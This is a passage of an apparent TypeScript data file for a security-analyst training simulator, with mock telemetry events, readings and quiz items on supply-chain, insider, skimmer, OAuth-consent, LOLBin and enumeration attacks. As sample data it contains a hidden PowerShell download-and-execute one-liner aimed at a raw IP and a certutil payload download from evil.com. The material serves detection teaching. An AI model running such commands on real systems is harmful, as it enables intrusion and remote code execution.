import type { TelemetryEvent } from "@/lib/sim/types";

// ── Event 1: Dependency-confusion / npm postinstall reverse shell ───────────
const supplyChainEvent: TelemetryEvent = {
  id: "evt-edge-supplychain-001",
  ts: "2024-08-14T11:02:41.000Z",
  source: "edr",
  vendor: "CrowdStrike Falcon",
  event_type: "process_create",
  severity: "high",
  hostname: "LT-DEV-0212",
  user_email: "d.wong@nexacorp.com",
  description: "node.exe spawned a reverse-shell connection from a package postinstall script during npm install",
  mitre_technique: "T1195.001",
  mitre_tactic: "Initial Access",
  process: {
    name: "node.exe",
    pid: 8821,
    parent_name: "npm.cmd",
    parent_pid: 6610,
    cmdline:
      "node -e \"require('child_process').exec('powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString(\\\"http://185.220.101.47/stage2.ps1\\\")')\"",
    user: "NEXACORP\\d.wong",
    integrity: "medium",
  },
  network: {
    domain: "185.220.101.47",
    url: "http://185.220.101.47/stage2.ps1",
  },
  raw: {
    "crowdstrike.event_simpleName": "ProcessRollup2",
    "crowdstrike.Tactic": "Initial Access",
    "threat.tactic.id": "TA0001",
    "threat.technique.id": "T1195",

    "threat.technique.subtechnique.id": "T1195.001",
    "crowdstrike.Severity": "High",
    "crowdstrike.PatternDispositionDescription": "Detection, No Action",
    "crowdstrike.FileName": "node.exe",
    "crowdstrike.ProcessId": "8821",
    "crowdstrike.ImageFileName": "C:\\Program Files\\nodejs\\node.exe",
    "crowdstrike.CommandLine":
      "node -e \"require('child_process').exec('powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString(\\\"http://185.220.101.47/stage2.ps1\\\")')\"",
    "crowdstrike.ParentImageFileName": "npm.cmd",
    "crowdstrike.ParentProcessId": "6610",
    "crowdstrike.ParentCommandLine": "npm install internal-logging-utils",
    "crowdstrike.UserName": "NEXACORP\\d.wong",
    "crowdstrike.ComputerName": "LT-DEV-0212",
    "process.code_signature.exists": true,
    "process.code_signature.trusted": true,
    "npm.package_name": "internal-logging-utils",
    "npm.package_version": "1.0.4",
    "npm.registry": "https://registry.npmjs.org",
    "npm.scripts.postinstall": "node ./scripts/setup.js",
    "action_result": "detected",
  },
};

// ── Event 2: OAuth consent grant to rogue Azure AD app ───────────────────────
const oauthConsentEvent: TelemetryEvent = {
  id: "evt-edge-oauth-001",
  ts: "2024-09-03T14:12:09.000Z",
  source: "o365",
  vendor: "Microsoft Entra ID",
  event_type: "account_modify",
  severity: "medium",
  hostname: undefined,
  user_email: "r.patel@nexacorp.com",
  description: "User granted delegated Mail.Read and offline_access permissions to a third-party OAuth application",
  mitre_technique: "T1528",
  mitre_tactic: "Credential Access",
  raw: {
    "data.office365.Operation": "Consent to application.",
    "data.office365.Workload": "AzureActiveDirectory",
    "data.office365.UserId": "r.patel@nexacorp.com",
    "data.office365.AzureActiveDirectoryEventType": "ApplicationManagement",
    "data.office365.ResultStatus": "Success",
    "data.office365.ActorIpAddress": "94.102.61.10",
    "data.office365.ApplicationId": "3f7a9c1e-88bb-4a2f-9e11-6d0a7e5b2c31",
    "data.office365.ApplicationDisplayName": "Quick Doc Viewer",
    "data.office365.ExtendedProperties.Name": "RequestedScopes",
    "data.office365.ExtendedProperties.Value":
      "Mail.Read offline_access User.Read Contacts.Read",
    "data.office365.ModifiedProperties.Name": "ConsentAction.Permissions",
    "data.office365.ModifiedProperties.NewValue": "Mail.Read, offline_access, User.Read, Contacts.Read",
    "data.office365.ModifiedProperties.OldValue": "[]",
    "GeoLocation.country_name": "Latvia",
    "GeoLocation.location.lat": 56.9496,
    "GeoLocation.location.lon": 24.1052,
    "action_result": "allowed",
  },
};

// ── Event 2b: a second, separate consent grant (used by the AC verdict task) ─
const oauthConsentEvent2: TelemetryEvent = {
  id: "evt-edge-oauth-002",
  ts: "2024-09-17T22:41:37.000Z",
  source: "o365",
  vendor: "Microsoft Entra ID",
  event_type: "account_modify",
  severity: "medium",
  hostname: undefined,
  user_email: "j.alvarez@nexacorp.com",
  description: "User granted delegated Files.Read.All, Mail.Read and offline_access permissions to a third-party OAuth application",
  mitre_technique: "T1528",
  mitre_tactic: "Credential Access",
  raw: {
    "data.office365.Operation": "Consent to application.",
    "data.office365.Workload": "AzureActiveDirectory",
    "data.office365.UserId": "j.alvarez@nexacorp.com",
    "data.office365.AzureActiveDirectoryEventType": "ApplicationManagement",
    "data.office365.ResultStatus": "Success",
    "data.office365.ActorIpAddress": "203.0.113.58",
    "data.office365.ApplicationId": "9c41e7b2-5d3a-4f60-a8e2-17b0c9d4f6a1",
    "data.office365.ApplicationDisplayName": "PDF Signer Pro",
    "data.office365.ExtendedProperties.Name": "RequestedScopes",
    "data.office365.ExtendedProperties.Value":
      "Files.Read.All Mail.Read offline_access User.Read",
    "data.office365.ModifiedProperties.Name": "ConsentAction.Permissions",
    "data.office365.ModifiedProperties.NewValue": "Files.Read.All, Mail.Read, offline_access, User.Read",
    "data.office365.ModifiedProperties.OldValue": "[]",
    "GeoLocation.country_name": "Romania",
    "GeoLocation.location.lat": 44.4268,
    "GeoLocation.location.lon": 26.1025,
    "action_result": "allowed",
  },
};

// ── Event 3: Low-and-slow insider exfiltration (below DLP thresholds) ────────
const lowAndSlowEvent: TelemetryEvent = {
  id: "evt-edge-lowslow-001",
  ts: "2024-07-22T16:41:00.000Z",
  source: "o365",
  vendor: "Microsoft 365 Unified Audit Log",
  event_type: "sharepoint_download",
  severity: "low",
  hostname: "LT-FIN-1187",
  user_email: "m.reyes@nexacorp.com",
  description: "User downloaded 14 files from the Contracts SharePoint library, the seventeenth consecutive day of small downloads from the same library",
  raw: {
    "data.office365.Operation": "FileDownloaded",
    "data.office365.Workload": "SharePoint",
    "data.office365.UserId": "m.reyes@nexacorp.com",
    "data.office365.ClientIP": "10.20.4.61",
    "data.office365.SiteUrl": "https://nexacorp.sharepoint.com/sites/Contracts",
    "data.office365.SourceFileName": "Vendor-Agreement-Q3-0142.pdf",
    "data.office365.SourceRelativeUrl": "Shared Documents/Active",
    "data.office365.ItemCount": 14,
    "data.office365.ResultStatus": "Succeeded",
    "dlp.policy_evaluated": "Financial Data: Bulk Download Block",
    "dlp.threshold_files_per_hour": 50,
    "dlp.observed_files_this_hour": 14,
    "dlp.rule_triggered": false,
    "ueba.baseline_daily_downloads": "2-3",
    "ueba.consecutive_days_elevated": 17,
    "ueba.cumulative_files_30d": 238,
    "ueba.library_role_relevance": "LOW",
    "user.department": "Finance",
    "action_result": "allowed",
  },
};

// ── Event 4: Impossible-travel that is actually a corporate VPN egress hop ──
const impossibleTravelFPEvent: TelemetryEvent = {
  id: "evt-edge-travel-001",
  ts: "2024-10-11T09:03:52.000Z",
  source: "okta",
  vendor: "Okta",
  event_type: "auth_success",
  severity: "medium",
  hostname: undefined,
  user_email: "k.oconnell@nexacorp.com",
  src_ip: "198.51.100.20",
  description: "Successful login for k.oconnell from a Dublin IP address, eleven minutes after a login from a Chicago IP address",
  raw: {
    "okta.eventType": "user.session.start",
    "okta.outcome.result": "SUCCESS",
    "okta.authenticationContext.authenticationStep": "0",
    "okta.authenticationContext.credentialProvider": "OKTA_CREDENTIAL_PROVIDER",
    "okta.client.ipAddress": "198.51.100.20",
    "okta.client.geographicalContext.country": "Ireland",
    "okta.client.geographicalContext.city": "Dublin",
    "okta.actor.displayName": "Kevin O'Connell",
    "okta.actor.id": "00u3f7a9c1e88bb4a2f",
    "okta.actor.type": "User",
    "okta.securityContext.isProxy": "true",
    "okta.securityContext.asNumber": "AS64500",
    "okta.securityContext.asOrg": "NexaCorp Ltd - Corporate VPN Egress EMEA",
    "okta.previousLogin.ipAddress": "172.56.22.104",
    "okta.previousLogin.city": "Chicago",
    "okta.previousLogin.country": "United States",
    "okta.previousLogin.minutesAgo": 11,
    "network.vpn_client": "GlobalProtect",
    "network.vpn_gateway_pool": "nexacorp-vpn-emea-dublin-01",
    "action_result": "success",
  },
};

// ── Event 5: LOLBin — regsvr32 used by an actual sysadmin for a legit COM DLL
const lolbinEvent: TelemetryEvent = {
  id: "evt-edge-lolbin-001",
  ts: "2024-11-05T19:55:03.000Z",
  source: "edr",
  vendor: "Microsoft Defender for Endpoint",
  event_type: "process_create",
  severity: "medium",
  hostname: "SRV-APP-0044",
  user_email: "t.mendes@nexacorp.com",
  description: "regsvr32.exe registered a DLL on an application server outside the scheduled maintenance window",
  mitre_technique: "T1218.010",
  mitre_tactic: "Stealth",
  process: {
    name: "regsvr32.exe",
    pid: 4420,
    parent_name: "cmd.exe",
    parent_pid: 3312,
    cmdline: "regsvr32.exe /s C:\\AppDeploy\\ReportEngine\\ReportViewerCtl.dll",
    user: "NEXACORP\\t.mendes",
    integrity: "high",
  },
  raw: {
    "mde.ActionType": "ProcessCreated",
    "mde.DetectionSource": "EDR",
    "mde.SHA256": "b4a1c9d7e2f56830a1bb44c02f7de9915ee2c4a7f0c8b13d5e9a2f6c7b8d901",
    "process.name": "regsvr32.exe",
    "process.pid": "4420",
    "process.command_line": "regsvr32.exe /s C:\\AppDeploy\\ReportEngine\\ReportViewerCtl.dll",
    "process.parent.name": "cmd.exe",
    "process.parent.pid": "3312",
    "process.parent.command_line": "cmd.exe /c deploy_report_engine.bat",
    "user.name": "NEXACORP\\t.mendes",
    "host.name": "SRV-APP-0044",
    "process.code_signature.exists": true, "process.code_signature.trusted": true,
    "file.publisher": "NexaCorp Internal Engineering",
    "network.connection_made": "false",
    "change_management.ticket_id": "CHG0041823",
    "change_management.scheduled_window": "2024-11-05T20:00:00Z to 2024-11-05T22:00:00Z",
    "change_management.actual_time": "2024-11-05T19:55:03Z",
    "action_result": "allowed",
  },
};

// ── Event 6: Business-logic attack — password-reset / account enumeration ───
const passwordResetAbuseEvent: TelemetryEvent = {
  id: "evt-edge-bizlogic-001",
  ts: "2024-12-02T03:14:27.000Z",
  source: "waf",
  vendor: "Cloudflare WAF",
  event_type: "http_request",
  severity: "medium",
  src_ip: "45.142.212.61",
  description: "212 sequential requests to the password-reset endpoint using an incrementing list of email addresses, each returning a different response time",
  mitre_technique: "T1589.002",
  mitre_tactic: "Reconnaissance",
  network: {
    url: "https://portal.nexacorp.com/api/v1/auth/forgot-password",
    method: "POST",
    status: 200,
  },
  raw: {
    "http.request.method": "POST",
    "http.request.uri.path": "/api/v1/auth/forgot-password",
    "http.response.status_code": "200",
    "http.request.headers.user_agent": "python-requests/2.31.0",
    "client.ip": "45.142.212.61",
    "client.geo.country": "Ukraine",
    "client.geo.city": "Kyiv",
    "cf.threat_score": "18",
    "cf.bot_management.score": "4",
    "cf.bot_management.verified_bot": "false",
    "waf.rule_triggered": "none",
    "waf.rate_limit_threshold_per_min": 100,
    "waf.observed_requests_per_min": 42,
    "app.response_time_variance_ms": "user_exists=812ms avg, user_not_exists=94ms avg",
    "app.emails_attempted_last_hour": 212,
    "app.unique_emails_attempted": 212,
    "action_result": "allowed",
  },
};

const edgeCaseRoom = {
  id: "edge-case-usecases",
  title: "Unusual Attacks and Edge-Case Use Cases",
  description:
    "An advanced room built for analysts who already know the textbook attacks and now need to see the ones that don't look like attacks at all. Every scenario here was chosen because it routinely slips past experienced SOC teams: a malicious package that installs itself through a trusted build process, an insider who never crosses a DLP threshold, a third-party script that turns a checkout page into a skimmer, a SaaS app nobody approved, an admin tool abused in a way that looks exactly like admin work, an OAuth consent screen that never touches malware, a geographically 'impossible' login that is actually a VPN hop, and a password-reset form quietly used to map your entire user directory. For each case you will learn why it is missed and exactly which field or behavioral tell breaks the disguise.",
  difficulty: "advanced" as const,
  category: "Threat Detection",
  estimatedMinutes: 90,
  xp: 420,
  icon: "🕵️",
  prerequisites: ["investigation-methodology", "alert-triage"],
  tasks: [
    // ── Reading 1: Supply chain / dependency confusion ─────────────────────
    {
      type: "reading" as const,
      id: "edge-r1",
      heading: "Supply Chain and Dependency Confusion: The Attack Nobody Watches For",
      content:
        "Most detection programs are built around a simple mental model: an attacker sends a malicious file or link, a user opens it, malware runs. Supply-chain attacks break that model completely, because the malicious code arrives through a channel everyone implicitly trusts: the build process itself. A developer runs 'npm install' or 'pip install' dozens of times a day. It is routine, expected, and almost never questioned by a SOC analyst watching an alert queue.\n\n" +
        "Dependency confusion is one of the cleanest versions of this attack. Large companies often have internal, private packages named things like 'nexacorp-logging-utils' that are never published to the public npm or PyPI registry. They only exist on an internal package server. An attacker researches the company (through job postings, GitHub repos, leaked internal documentation) and publishes a PUBLIC package with the exact same name, but a higher version number, to the public registry. Because many build tools default to checking the public registry first, or fail over to it when the internal server is briefly unreachable, the higher-versioned public package can silently win the dependency resolution and get installed instead of the real one.\n\n" +
        "The other common variant is typosquatting: 'reqeusts' instead of 'requests', 'crossenv' instead of 'cross-env'. A tired developer typing quickly, or a copy-pasted install command from a tutorial with a typo, is enough. Once the malicious package is selected, the payload usually does not run as a separate suspicious executable. It runs inside an npm 'postinstall' script or a Python 'setup.py' during install, which is a completely normal and expected part of package installation. That script can spawn a shell, phone home, or drop a stager, all under the identity and process lineage of npm.cmd or pip.exe, tools your EDR almost certainly has an exclusion or a low baseline suspicion score for.\n\n" +
        "Why analysts miss it: the alert (if one fires at all) shows a child process of npm.cmd or python.exe, which analysts are trained to associate with normal developer workflow noise. The parent-child relationship looks legitimate because, mechanically, it is legitimate: npm really did spawn node.exe, which really did execute a script. The malicious intent is buried inside the command line arguments and the destination of the outbound connection, not in the process tree shape.\n\n" +
        "The detection tell: look at what the spawned process is actually doing, not what spawned it. A postinstall script that opens a network connection to an IP address (not a domain), especially over plain HTTP, and especially followed by a PowerShell download-and-execute pattern, is the signal. Regardless of how innocent the parent process looks. Cross-reference the package name and version against your internal artifact registry: if the version installed does not match what your internal registry serves, or the package was pulled from the public registry when an internal equivalent exists, that mismatch alone is worth an alert.",
      codeExample:
        "SUSPICIOUS PROCESS TREE (looks routine at first glance)\n" +
        "==========================================================\n" +
        "cmd.exe\n" +
        "  \\_ npm.cmd  (cmdline: npm install internal-logging-utils)\n" +
        "       \\_ node.exe  (cmdline: node -e \"require('child_process').exec(\n" +
        "            'powershell -nop -w hidden -c IEX(New-Object Net.WebClient)\n" +
        "             .DownloadString(\\\"http://185.220.101.47/stage2.ps1\\\")')\")\n\n" +
        "WHY IT PASSES CASUAL REVIEW:\n" +
        "  - npm.cmd spawning node.exe is 100% normal: happens constantly\n" +
        "  - No suspicious file dropped to disk yet\n" +
        "  - No AV signature match (payload is fileless, delivered inline)\n\n" +
        "THE TELL:\n" +
        "  - node -e (inline eval) is unusual for a postinstall script\n" +
        "  - Destination is a raw IP, not a CDN or known package host\n" +
        "  - PowerShell download-and-execute chained immediately after\n" +
        "  - Package 'internal-logging-utils' matches an INTERNAL-ONLY name\n" +
        "    but was resolved from the PUBLIC npm registry\n",
      checkpoint: {
        question: "According to the reading, why can a dependency-confusion attack succeed even when an organization already has a legitimate internal package with the same name?",
        options: [
          "Build tools often check the public registry first or fail over to it, so a higher-versioned public package wins",
          "The attacker breaks into the internal package server and swaps the real package for a malicious build of it",
          "The developer mistypes the internal name, and a public package registered under the typo gets installed instead",
          "The public package carries a lower version number, which build tools treat as the stable release to prefer",
        ],
        answer: 0,
        explanation: "The reading explains that many build tools check the public registry first, or fail over to it when the internal server is unreachable, so a public package with the same name and a HIGHER version number silently wins resolution over the real internal one: no break-in and no typo required. “The attacker breaks into the internal package server” describes a different supply-chain compromise; dependency confusion never touches the internal server. “The developer mistypes the internal name” is typosquatting, the other variant the reading describes, which relies on a typo rather than an identical name. “The public package carries a lower version number” has the direction backwards: resolvers prefer the higher version, which is why attackers publish one.",
      },
    },

    // ── Reading 2: Insider threat — low-and-slow, under DLP thresholds ──────
    {
      type: "reading" as const,
      id: "edge-r2",
      heading: "Insider Threat: Low-and-Slow Theft That Never Trips a Threshold",
      content:
        "DLP (Data Loss Prevention) systems are built around thresholds: block if a user downloads more than 50 files per hour, alert if an email attachment exceeds 25MB, flag if a single USB copy exceeds 500MB. These thresholds exist because security teams need a bright line to avoid drowning in noise, and attackers who understand this simply stay under the line.\n\n" +
        "A malicious insider planning to leave a company with a competitor's contract book does not need speed. They have weeks or months. Instead of one large download that trips a bulk-export alert, they download twelve to fifteen files a day from the same SharePoint library, every day, for weeks. Each individual session looks unremarkable: a handful of PDFs, well under any per-hour or per-day threshold your DLP policy enforces. No single event would ever justify escalation on its own.\n\n" +
        "Why analysts miss it: DLP and most SIEM correlation rules are inherently stateless or short-window, they evaluate the last hour, or the last 24 hours, and reset. A user downloading 14 files today generates the same low-severity, informational-grade event as a user downloading 14 files for the first time ever. Nothing in the event itself encodes 'this is the seventeenth consecutive day of elevated activity from a user whose baseline is 2-3 downloads per day.' That context lives only in behavioral baselining (UEBA), which many organizations either do not have, do not tune, or do not route into the same alert queue their L1 analysts triage.\n\n" +
        "The detection tell: this attack is invisible at the single-event layer and only visible at the trend layer. The signal is a sustained deviation from personal baseline over a rolling multi-week window, not a single crossed threshold. Fields to watch: cumulative file count over 30 days compared to the user's historical average, number of consecutive days with elevated (but individually sub-threshold) activity, and, critically, whether the access pattern is unusual for the user's role (a salesperson pulling from Legal's contract library is a bigger tell than the raw volume ever will be). The fix is not a lower threshold (that just moves the goalpost and increases false positives). It is a UEBA baseline comparison layered on top of the DLP event stream.",
      codeExample:
        "SINGLE DAY VIEW (what the DLP console shows: looks fine)\n" +
        "=============================================================\n" +
        "  2024-07-22  m.reyes@nexacorp.com\n" +
        "  Operation: FileDownloaded (SharePoint - Contracts library)\n" +
        "  ItemCount: 14\n" +
        "  dlp.threshold_files_per_hour: 50\n" +
        "  dlp.rule_triggered: false        <-- nothing fires, looks routine\n\n" +
        "30-DAY TREND VIEW (what a UEBA baseline layer reveals)\n" +
        "=============================================================\n" +
        "  ueba.baseline_daily_downloads:      2-3 files/day (this user, historical)\n" +
        "  ueba.consecutive_days_elevated:      17 days in a row at 10-15 files/day\n" +
        "  ueba.cumulative_files_30d:            238 files  (vs. baseline ~75)\n" +
        "  ueba.library_role_relevance:         LOW (Finance user, Contracts library\n" +
        "                                        not part of normal job function)\n\n" +
        "  --> No single day crosses a DLP threshold.\n" +
        "  --> The TREND is the alert. The event stream alone is not.",
    },

    // ── Reading 3: Third-party / vendor compromise — Magecart & MSP tooling ─
    {
      type: "reading" as const,
      id: "edge-r3",
      heading: "Third-Party Compromise: Magecart-Style Skimmers and Trusted MSP Tools",
      content:
        "Not every breach starts inside the target's own environment. Two of the most damaging and hardest-to-detect attack patterns exploit trust in a third party the victim organization did not build, does not control, and often cannot see inside of: web-embedded third-party scripts, and managed service provider (MSP) remote-access tools.\n\n" +
        "Magecart-style attacks target the software supply chain of a website rather than the website's own code. E-commerce checkout pages routinely load JavaScript from a chat widget vendor, an analytics vendor, an A/B testing vendor, a payment-tokenization helper, sometimes a dozen third-party scripts on a single page. If an attacker compromises just one of those vendors (or the CDN hosting their script), they can inject a small snippet of skimming JavaScript that silently copies credit card form fields and exfiltrates them to an attacker-controlled domain, all while the checkout page itself continues to function perfectly and the payment still completes successfully. The victim's own web application logs show nothing wrong because the compromise never touched the victim's server-side code. It happened in the customer's browser, sourced from a script the victim's own page legitimately requested.\n\n" +
        "The MSP compromise pattern works similarly but through IT infrastructure instead of a web page. Many organizations grant their managed service provider persistent, highly privileged remote access via tools like ConnectWise, Kaseya, or a similar RMM (Remote Monitoring and Management) platform, often with domain admin-equivalent rights, because that access is needed to patch and manage every endpoint. If the MSP itself is compromised (or the RMM software vendor is compromised, as happened at scale in real-world supply-chain incidents), the attacker inherits legitimate, trusted, already-whitelisted remote access into every one of that MSP's downstream customers simultaneously. From the victim's perspective, the activity comes from a tool they explicitly trust, authenticating with credentials that are supposed to be there, at a time the MSP normally does maintenance.\n\n" +
        "Why analysts miss both: in the Magecart case, the malicious code never appears in the organization's own source repository or web server logs, it lives entirely in a third party's script, loaded client-side. Standard web application monitoring, WAF rules, and code review never see it. In the MSP case, the access itself is not anomalous by any identity or authentication metric. It is the correct account, from the correct (whitelisted) source, doing the kind of thing that account is supposed to do. The anomaly is behavioral and contextual, not credential-based.\n\n" +
        "The detection tell: for Magecart, monitor Subresource Integrity (SRI) hash mismatches, unexpected new outbound domains initiated from the checkout page in browser telemetry (Content-Security-Policy violation reports are gold here), and any third-party script that starts reading form field values it previously did not touch. For MSP compromise, the tell is behavioral deviation within the trusted tool's own usage pattern: the RMM session pushing a script to 40 endpoints simultaneously when this MSP normally touches 2-3 per session, or a session originating from an MSP source IP that has never been seen before, or PowerShell/psexec commands launched through the RMM tool that do not match any open ticket.",
      codeExample:
        "MAGECART, WHERE THE VISIBILITY GAP LIVES\n" +
        "=============================================================\n" +
        "  Victim's checkout page (own code: looks completely clean)\n" +
        "    <script src=\"https://victim-store.com/checkout.js\"></script>\n" +
        "    <script src=\"https://chat-widget-vendor.cdn.net/widget.js\"></script>\n" +
        "                                       ^\n" +
        "                                       |\n" +
        "                          compromised third-party CDN now serves:\n" +
        "                          widget.js + injected skimmer snippet\n" +
        "                          (reads #card-number, #cvv fields,\n" +
        "                           POSTs to evil-collector.ru)\n\n" +
        "  Victim server logs:        clean   (skimmer never touches server)\n" +
        "  Victim source repo:        clean   (script is loaded, not owned)\n" +
        "  Browser CSP violation log: THE TELL, unexpected POST target\n\n" +
        "MSP COMPROMISE: TRUSTED TOOL, UNTRUSTED OPERATOR\n" +
        "=============================================================\n" +
        "  RMM session: MSP-Technician-Account (whitelisted, always allowed)\n" +
        "  Normal pattern:   2-3 endpoints touched per session, business hours\n" +
        "  Compromised session: 40 endpoints touched in 6 minutes, 2 AM\n" +
        "  --> Same 'trusted' account. Behavior is the only anomaly.",
      checkpoint: {
        question: "According to the reading, what is the detection tell that most reliably surfaces a Magecart-style skimmer, since it never appears in the victim's own server-side logs?",
        options: [
          "SRI hash mismatches and unexpected outbound domains in Content-Security-Policy violation reports",
          "New outbound connections from the web server to unfamiliar domains, in its firewall egress logs",
          "WAF alerts for script injection (XSS) payloads submitted into the checkout form's input fields",
          "Unreviewed changes to checkout.js in the store's own source repository, caught in code review",
        ],
        answer: 0,
        explanation: "The reading states that for Magecart the tell is SRI hash mismatches and unexpected outbound domains, best surfaced through Content-Security-Policy violation reports: the skimmer runs in the customer's browser and never touches the victim's servers. “New outbound connections from the web server” looks in the wrong place: the browser, not the server, posts the card data to the attacker. “WAF alerts for script injection (XSS) payloads” assumes the attacker injects through the store's own forms; here the malicious code arrives inside a third-party vendor's script that the page legitimately loads. “Unreviewed changes to checkout.js in the store's own source repository” is exactly what the reading says stays clean: the script is loaded from the vendor, not owned by the store.",
      },
    },

    // ── Reading 4: Shadow IT + OAuth consent-grant phishing ─────────────────
    {
      type: "reading" as const,
      id: "edge-r4",
      heading: "Shadow IT and OAuth Consent Phishing: Attacks With No Malware At All",
      content:
        "Shadow IT refers to any application, cloud service, or SaaS tool that employees adopt without going through procurement, security review, or IT approval. A marketing team signs up for a free file-conversion tool. A developer connects a personal GitHub repo to a CI/CD SaaS product to save time. None of this is malicious in intent, but every one of these unsanctioned tools is a potential exfiltration path that your DLP, CASB, and monitoring stack were never configured to watch, because nobody told the security team it existed. The tool never appears in the approved-application inventory, so no policy was ever written for it, no API was ever integrated with your SIEM, and no analyst was ever briefed to expect its traffic.\n\n" +
        "OAuth consent-grant phishing (also called an 'illicit consent grant attack') is the technique that has made shadow-IT-style risk deliberately weaponizable, and it is one of the purest examples of an attack with zero malware. The attacker registers a legitimate-looking Azure AD or Google Workspace application (something named 'Quick Doc Viewer' or 'PDF Signer Pro') and sends the target a link to authorize it. Critically, this link goes through Microsoft's or Google's own real, legitimate OAuth consent page. There is no fake login page, no credential harvesting, no password ever typed anywhere but the real identity provider. The user is simply asked to click 'Accept' to grant the app a set of permissions: read email, read contacts, maintain offline access. If the user accepts, the attacker's application receives an OAuth token (valid, signed, and issued by Microsoft or Google itself) that grants ongoing API access to the victim's mailbox without ever needing the victim's password, and critically, without triggering MFA on subsequent access, because the token itself is the credential.\n\n" +
        "Why analysts miss this: every single API call the attacker's app subsequently makes is a completely legitimate, correctly authenticated call to Microsoft Graph or the Google Workspace API, using a token Microsoft or Google itself issued. There is no malware to detect, no C2 domain to block, no suspicious executable, no failed login, and, this is the critical part, no password compromise at all, so credential-based detections (impossible travel on password auth, brute force, spray) never fire. The only event that ever occurred was a user clicking 'Accept' on a real, Microsoft-hosted consent screen, which most security tooling logs as a routine, low-severity administrative event by default.\n\n" +
        "The detection tell: the event to hunt for is 'Consent to application' (or the Google Workspace equivalent) in the identity provider's audit log, cross-referenced against three risk factors: the requested scope includes 'offline_access' (this is what makes the token persist and refresh indefinitely instead of expiring at the end of the browser session. Almost no legitimate low-trust utility app needs this), the application was registered very recently or by an external/unverified publisher, and the requesting user's session at consent time came from a geography or IP the user does not normally use. None of these three signals alone is damning, but 'offline_access' scope plus an unverified publisher plus an unusual login geography together is a near-certain illicit consent grant, and it is entirely detectable from Azure AD audit logs alone: no EDR, no malware sandbox, no network IOC required.",
      codeExample:
        "OAUTH CONSENT PHISHING: THE ENTIRE 'ATTACK' IN ONE EVENT\n" +
        "=============================================================\n" +
        "  User receives email: 'Please review this document, click to open'\n" +
        "  Link goes to: https://login.microsoftonline.com/common/oauth2/...\n" +
        "                (REAL Microsoft domain, nothing to flag as phishing)\n\n" +
        "  Consent screen shows (rendered BY Microsoft, not the attacker):\n" +
        "    'Quick Doc Viewer wants to:\n" +
        "       - Read your mail                        <-- Mail.Read\n" +
        "       - Maintain access to data you gave access to <-- offline_access\n" +
        "       - Read your contacts                    <-- Contacts.Read\n" +
        "     [Cancel]  [Accept]'\n\n" +
        "  User clicks Accept.\n" +
        "  --> Microsoft issues a REAL, VALID OAuth token to the attacker's app.\n" +
        "  --> No password was ever entered on an attacker-controlled page.\n" +
        "  --> No MFA challenge needed for the app's future API calls: \n" +
        "      the token itself IS the ongoing credential.\n\n" +
        "  From this point on, EVERY subsequent event is a normal,\n" +
        "  correctly-authenticated Microsoft Graph API call. There is\n" +
        "  no malware, no C2 traffic, and no failed-login signal.\n" +
        "  (The app's later access IS logged: service-principal\n" +
        "  sign-ins, MailItemsAccessed with its AppId, Graph activity\n" +
        "  logs, but it looks like normal, authorized API traffic.)\n\n" +
        "  EARLIEST AND CHEAPEST DETECTION POINT: the consent grant.\n" +
        "    o365.Operation = 'Consent to application.'\n" +
        "    RequestedScopes CONTAINS 'offline_access'   <-- red flag\n" +
        "    ApplicationDisplayName = unverified / recently registered\n",
    },

    // ── Reading 5: LOLBins, impossible-travel FPs, and business logic attacks
    {
      type: "reading" as const,
      id: "edge-r5",
      heading: "Living-off-the-Land, VPN False Positives, and Business-Logic Abuse",
      content:
        "Three more edge cases round out this room, and each one shares a common thread: the raw telemetry looks identical whether the activity is malicious or completely routine. The only way to tell them apart is context that lives outside the log itself.\n\n" +
        "Living-off-the-land binaries (LOLBins) are legitimate, digitally signed Windows utilities. Certutil.exe, regsvr32.exe, mshta.exe, rundll32.exe, bitsadmin.exe. That attackers repurpose to download files, execute code, or bypass application whitelisting, because these binaries are trusted by design and rarely blocked. certutil.exe is meant to manage certificates, but 'certutil -urlcache -f http://evil.com/payload.exe payload.exe' downloads a file just as well as any browser. regsvr32.exe is meant to register COM DLLs, but it can also load a remote script via the 'scrobj.dll' technique (T1218.010, sometimes called 'Squiblydoo'). The critical trap for analysts: administrators use these exact same tools for exactly these purposes, constantly, as part of normal deployment work. A regsvr32 call registering an internal reporting DLL from a change-managed deployment script is indistinguishable, at the process-execution level, from an attacker registering a malicious scriptlet: same binary, same event ID, same general shape of command line. The signal an analyst must chase is not 'was regsvr32 used' (that question alone produces overwhelming noise), but whether the DLL/script being registered is internally signed and version-controlled, whether the timing lines up with an approved change ticket, and whether a network connection follows the registration (legitimate local DLL registration makes no outbound call; the Squiblydoo technique specifically does, because it is fetching a remote scriptlet).\n\n" +
        "Impossible travel is a classic UEBA/identity detection: a user logs in from Chicago, then twelve minutes later from Dublin, and no commercial flight makes that trip in twelve minutes, so the alert fires as a probable compromised account. But this detection has a well-known, extremely common false-positive source: corporate VPN and cloud-proxy egress. Many enterprises route all remote-worker internet traffic through centralized VPN concentrators or SASE/CASB egress points, and those egress points may sit in a completely different country from the employee. An employee physically in Chicago connects to the corporate VPN, and their outbound traffic egresses from a company-owned pool of IPs in Dublin, because that is where the nearest regional VPN gateway or SASE PoP happens to be. The 'impossible' jump from a Chicago-originated first login (maybe an already-cached mobile session) to a Dublin-sourced second login is not two different people in two countries. It is one person whose traffic legitimately changed apparent origin because of infrastructure, not geography. The detection tell that separates a real account-takeover impossible-travel event from a VPN false positive: check the ASN and organization name behind the second IP. If it resolves to a known corporate VPN provider or your own company's registered egress ASN (not a residential ISP, not an unrelated hosting provider), and especially if a 'security_context.is_proxy' or equivalent field is true, this is very likely infrastructure, not intrusion, though it still deserves a quick verify, because attackers do sometimes route through commercial VPN services specifically to blend into this exact blind spot.\n\n" +
        "Business-logic attacks exploit the intended behavior of an application rather than any code vulnerability, which means signature-based and even most anomaly-based network detections never see them, because no single request is malformed or malicious: the abuse is in the pattern of legitimate requests. Password-reset and account-enumeration abuse is the clearest example: a 'forgot password' endpoint that returns a different response time, a different HTTP status code, or a different message ('no account found' vs. 'reset email sent') depending on whether the submitted email address exists in the system, can be automated against a wordlist of thousands of email addresses to enumerate every valid user account in the organization: all through requests that are each, individually, completely well-formed and application-legitimate. No exploit is used; the application is functioning exactly as designed. The detection tell is velocity and pattern at the business-transaction layer rather than the network-request layer: a single source IP submitting hundreds of sequential, distinct email addresses to a password-reset endpoint in a short window, especially when paired with measurable response-time variance between 'user exists' and 'user does not exist' paths, is the signature of enumeration, and it is a signal only visible if you are logging and analyzing the application's own business logic outcomes, not just whether the HTTP request succeeded.",
      codeExample:
        "LOLBIN: SAME COMMAND, TWO COMPLETELY DIFFERENT STORIES\n" +
